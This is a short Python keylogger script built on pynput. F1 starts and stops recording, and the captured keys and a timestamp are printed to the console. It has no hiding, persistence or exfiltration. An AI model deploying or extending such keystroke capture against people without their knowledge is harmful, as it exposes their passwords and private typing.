import os
import datetime
from pynput import keyboard

start_date_time = str(datetime.datetime.now())[:-7]
list_of_keys = []
print("[KeyLogger] Press F1 to start/stop")
print("[KeyLogger] Waiting for input...")


k = 0
pol = 0

def on_press(Key):
    global k, pol
    if Key == keyboard.Key.f1:
        k = 1
    if k and not pol:
        print("[KeyLogger] Started")
        pol = 1
    elif k and pol:
        print("[KeyLogger] Stopped")
        l.stop()

def on_release(Key):
    global list_of_keys, pol, k
    if Key == keyboard.Key.f1:
        k = 0
    if pol:
        list_of_keys.append(Key)

with keyboard.Listener(on_press=on_press, on_release=on_release) as l:
    l.join()

if list_of_keys:
    print(start_date_time)
    print(list_of_keys)
